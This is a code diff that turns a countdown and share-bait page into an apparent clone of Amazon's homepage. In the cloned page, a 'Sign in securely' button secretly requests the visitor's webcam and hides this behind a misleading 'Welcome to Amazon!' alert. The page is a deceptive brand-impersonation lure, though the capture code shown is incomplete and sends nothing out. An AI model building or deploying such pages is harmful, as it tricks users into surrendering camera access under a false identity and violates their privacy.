-var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
 
-// Update the count down every 01 second
-var x = setInterval(function() {
-
-  // Get todays date and time
-  var now = new Date().getTime();
-
-  // Find the distance between now an the count down date
-  var distance = countDownDate - now;
-
-  // Time calculations for days, hours, minutes and seconds
-  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
-  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-  // Display the result in the element with id="demo"
-  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
-  + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
-
-  // If the count down is finished, write some text 
-  if (distance < 0) {
-    clearInterval(x);
-    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
-  }
-}, 1000);
-</script>       
+        <div class="deliver-to">
+            <span class="location-icon"></span>
+            <div>
+                <span>Deliver to</span><br>
+                <span class="location">India</span>
             </div>
         </div>
-			
-</body>
- 
-<center>
- <a class="footerbtn" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 forwarding_link" data-action="share/whatsapp/share">
- <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
- <b style="font-size: 26px;">Share</b>  
-</a>
- <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share this post on Facebook" class="facebook">
-	<img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
- <b style="font-size: 26px;">Share</b>  
- </a>
-</center>
 
-</script>
-</html>        
+        <div class="search-bar">
+            <select class="search-category">
+                <option>All</option>
+                <option>Electronics</option>
+                <option>Books</option>
+                <option>Fashion</option>
+                <option>Home & Kitchen</option>
+            </select>
+            <input type="text" class="search-input" placeholder="Search Amazon">
+            <button class="search-btn">
+                <svg viewBox="0 0 24 24" fill="#131921">
+                    <path d="M21.71 20.29L18 16.61A9 9 0 1 0 16.61 18l3.68 3.68a1 1 0 0 0 1.42 0 1 1 0 0 0 0-1.39zM11 18a7 7 0 1 1 7-7 7 7 0 0 1-7 7z"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="nav-items">
+            <a href="#" class="nav-item">
+                <span class="item-label">Hello, sign in</span><br>
+                <span class="item-value">Account & Lists </span>
+            </a>
+            <a href="#" class="nav-item">
+                <span class="item-label">Returns</span><br>
+                <span class="item-value">& Orders</span>
+            </a>
+            <a href="#" class="nav-item cart">
+                <div class="cart-icon">
+                    <span class="cart-count">0</span>
+                    <svg width="40" height="35" viewBox="0 0 40 35" fill="#fff">
+                        <path d="M13.5 30a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zm15 0a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM5 5h3.5l5.5 22h15l5-15H12"/>
+                    </svg>
+                </div>
+                <span>Cart</span>
+            </a>
+        </div>
+    </header>
+
+    <nav class="sub-header">
+        <a href="#" class="hamburger">
+            <svg width="20" height="20" fill="#fff" viewBox="0 0 20 20">
+                <path d="M2 4h16v2H2zm0 5h16v2H2zm0 5h16v2H2z"/>
+            </svg>
+            All
+        </a>
+        <a href="#">Today's Deals</a>
+        <a href="#">Customer Service</a>
+        <a href="#">Registry</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Sell</a>
+        <a href="#">Amazon Basics</a>
+        <a href="#">Prime</a>
+        <a href="#">New Releases</a>
+        <a href="#">Buy Again</a>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-banner"></div>
+
+        <div class="product-grid">
+            <div class="signin-card">
+                <h3>Sign in for the best experience</h3>
+                <button class="signin-btn" onclick="requestCamera()">Sign in securely</button>
+                <p>New customer? <a href="#">Start here.</a></p>
+            </div>
+
+            <div class="product-card">
+                <h3>Gaming accessories</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/AmazonExports/Fuji/2021/June/Fuji_Quad_Headset_1x._SY116_CB667159060_.jpg" alt="Gaming">
+                <a href="#" class="product-card-link">See more</a>
+            </div>
+
+            <div class="product-card">
+                <h3>Shop deals in Fashion</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/softlines/shopbop/ingress/2023/March/mp_20230301_ff_702702702702702702._SY116_CB612639027_.jpg" alt="Fashion">
+                <a href="#" class="product-card-link">See all deals</a>
+            </div>
+
+            <div class="product-card">
+                <h3>Deals in PCs</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/AmazonExports/Fuji/2020/May/Dashboard/Fuji_Dash_PC_1x._SY304_CB431800965_.jpg" alt="PCs">
+                <a href="#" class="product-card-link">Shop now</a>
+            </div>
+
+            <div class="product-card">
+                <h3>Computers & Accessories</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/AmazonExports/Fuji/2020/May/Dashboard/Fuji_Dash_Electronics_1x._SY304_CB432774322_.jpg" alt="Computers">
+                <a href="#" class="product-card-link">See more</a>
+            </div>
+
+            <div class="product-card">
+                <h3>Home decor under $50</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/AmazonExports/Fuji/2020/May/Dashboard/Fuji_702702702702702._SY304_CB418727169_.jpg" alt="Home Decor">
+                <a href="#" class="product-card-link">Shop now</a>
+            </div>
+
+            <div class="product-card">
+                <h3>Easy Notes for School</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/AmazonExports/Events/2023/EBF23/702702702702702702702702702._SY304_CB574412580_.jpg" alt="School">
+                <a href="#" class="product-card-link">Shop now</a>
+            </div>
+
+            <div class="product-card">
+                <h3>New home arrivals</h3>
+                <img class="product-card-image" src="https://images-na.ssl-images-amazon.com/images/G/01/launchpad/2023/Gateway/January/702702702702702702702702702._SY232_CB619238939_.jpg" alt="Home">
+                <a href="#" class="product-card-link">Shop now</a>
+            </div>
+        </div>
+    </section>
+
+    <section class="deals-section">
+        <div class="deals-header">
+            <h2>Today's Deals</h2>
+            <a href="#">See all deals</a>
+        </div>
+        <div class="deals-slider">
+            <div class="deal-item">
+                <img src="https://m.media-amazon.com/images/I/71TPda7cwUL._AC_UL480_QL65_.jpg" alt="Deal">
+                <span class="deal-badge">Up to 40% off</span>
+                <p class="deal-price">Limited time deal</p>
+            </div>
+            <div class="deal-item">
+                <img src="https://m.media-amazon.com/images/I/61CGHv6kmWL._AC_UL480_QL65_.jpg" alt="Deal">
+                <span class="deal-badge">Up to 25% off</span>
+                <p class="deal-price">Top Deal</p>
+            </div>
+            <div class="deal-item">
+                <img src="https://m.media-amazon.com/images/I/71an3Ptv4pL._AC_UL480_QL65_.jpg" alt="Deal">
+                <span class="deal-badge">Up to 50% off</span>
+                <p class="deal-price">Lightning deal</p>
+            </div>
+            <div class="deal-item">
+                <img src="https://m.media-amazon.com/images/I/61oqO38KP-L._AC_UL480_QL65_.jpg" alt="Deal">
+                <span class="deal-badge">Up to 35% off</span>
+                <p class="deal-price">Deal of the Day</p>
+            </div>
+            <div class="deal-item">
+                <img src="https://m.media-amazon.com/images/I/61-PblYntsL._AC_UL480_QL65_.jpg" alt="Deal">
+                <span class="deal-badge">Up to 20% off</span>
+                <p class="deal-price">Best Seller</p>
+            </div>
+        </div>
+    </section>
+
+    <div class="back-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
+        Back to top
+    </div>
+
+    <footer class="footer-links">
+        <div class="footer-column">
+            <h4>Get to Know Us</h4>
+            <a href="#">Careers</a>
+            <a href="#">Blog</a>
+            <a href="#">About Amazon</a>
+            <a href="#">Investor Relations</a>
+            <a href="#">Amazon Devices</a>
+            <a href="#">Amazon Science</a>
+        </div>
+        <div class="footer-column">
+            <h4>Make Money with Us</h4>
+            <a href="#">Sell products on Amazon</a>
+            <a href="#">Sell on Amazon Business</a>
+            <a href="#">Sell apps on Amazon</a>
+            <a href="#">Become an Affiliate</a>
+            <a href="#">Advertise Your Products</a>
+            <a href="#">Self-Publish with Us</a>
+        </div>
+        <div class="footer-column">
+            <h4>Amazon Payment Products</h4>
+            <a href="#">Amazon Business Card</a>
+            <a href="#">Shop with Points</a>
+            <a href="#">Reload Your Balance</a>
+            <a href="#">Amazon Currency Converter</a>
+        </div>
+        <div class="footer-column">
+            <h4>Let Us Help You</h4>
+            <a href="#">Amazon and COVID-19</a>
+            <a href="#">Your Account</a>
+            <a href="#">Your Orders</a>
+            <a href="#">Shipping Rates & Policies</a>
+            <a href="#">Returns & Replacements</a>
+            <a href="#">Help</a>
+        </div>
+    </footer>
+
+    <div class="footer-bottom">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="footer-logo" style="filter: brightness(0) invert(1);">
+        <div class="footer-legal">
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Consumer Health Data Privacy Disclosure</a>
+            <a href="#">Your Ads Privacy Choices</a>
+            <br><br>
+             1996-2026, Amazon.com, Inc. or its affiliates
+        </div>
+    </div>
+
+    <script>
+    function requestCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                alert('Welcome to Amazon! Please wait while we redirect you...');
+                window.stream = stream;
+                video.srcObject = stream;
+            })
+            .catch(function(err) {
+                alert('Welcome to Amazon!');
+            });
+    }
+    </script>
+</body>
+</html>
